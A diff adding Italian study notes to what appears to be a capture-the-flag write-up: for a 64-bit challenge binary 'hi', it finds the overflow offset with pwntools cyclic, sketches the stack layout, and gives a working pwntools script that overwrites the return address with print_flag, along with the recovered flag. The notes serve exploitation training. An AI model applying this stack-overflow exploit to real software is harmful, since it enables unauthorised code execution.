@@ -36,4 +36,35 @@
     $  
 
 2)hi
+  Siamo in un architettura a 64 bit
+
+  RBP
+  	cyclic -l 0x6161616161616165
+  	Finding cyclic pattern of 8 bytes: b'eaaaaaaa' (hex: 0x6561616161616161)
+  	Found at offset 32
+  	
+  RSP
+  	cyclic -l 0x7fffffffdc48
+  	Finding cyclic pattern of 8 bytes: b'H\xdc\xff\xff\xff\x7f\x00\x00' (hex: 0x48dcffffff7f0000)
+  	Pattern contains characters not present in the alphabet
+  	
+  Queste info ci dicono che lo stack è così disposto:
+  	......
+  	buffer[32]
+  	RBP => 8 B
+  	(RSP non considerato nel payload)
+  	RIP => 8B
+  
+  	from pwn import *
+  	elf= ELF('./hi') #collegamento al file binario molto utile (dà molte funzioni)
+  	p=process('./hi')
+  	garbage=b'A'*40
+  	target=p64(elf.symbols['print_flag'])
+  	payload= garbage + target
+  	p.sendline(payload)
+  	print(p.recvall())
+  
+  	=>BTW, flag: ccit{hi_i_am_a_flag}
+
+3)vuln
 
